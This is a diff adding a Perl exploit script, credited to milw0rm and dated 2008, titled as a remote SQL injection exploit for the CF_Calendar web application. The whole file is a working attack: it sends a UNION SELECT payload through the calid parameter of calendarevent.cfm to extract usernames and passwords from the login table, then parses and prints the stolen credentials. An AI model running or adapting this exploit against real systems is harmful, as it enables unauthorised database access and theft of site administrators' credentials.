@@ -1,0 +1,44 @@
+#!/usr/bin/perl
+
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+
+
+print "\n ********************************************\n";
+print " * CF_Calendar Remote SQL Injection Exploit *\n";
+print " *       By AlpHaNiX                        *\n";
+print " ********************************************\n";
+print " ********************************************\n";
+print " * usage : perl exploit.pl target           *\n";
+print " *  contact : AlpHa[AT]HACKER[DOT]BZ        *\n";
+print " ********************************************\n";
+
+
+
+$alpha1 = "calendarevent.cfm?calid=";
+$alpha2 = "0+union+select+1,concat(0x20616c7068616e69787761736865726520,username,0x20616e642070617373776f7264206973203a20,password,0x20616c7068616e69787761736865726520),3,4,null,6,7,8,9+from+login";
+
+
+
+if ($ARGV[0] =~ /http:\/\// ) { $target = $ARGV[0]."/"; } else { $target = "http://".$ARGV[0]."/"; }
+print " Working on it\n\n";
+
+my $alpha3 = $target.$alpha1.$alpha2;
+my $request   = HTTP::Request->new(GET=>$alpha3);
+my $useragent = LWP::UserAgent->new();
+$useragent->timeout(10);
+my $response  = $useragent->request($request);
+if ($response->is_success) {
+        my $res   = $response->content;
+        if ($res =~ m/ alphanixwashere (.*)and password is : (.*) alphanixwashere /g) {
+                my ($username,$passwd) = ($1,$2);
+                print "Username : $username \n\n  password : $passwd  \n\n"
+
+        }
+        else { print " operation failed \n\n"; }
+}
+else { print "  Error, ".$response->status_line."\n\n"; }
+
+# milw0rm.com [2008-12-10]
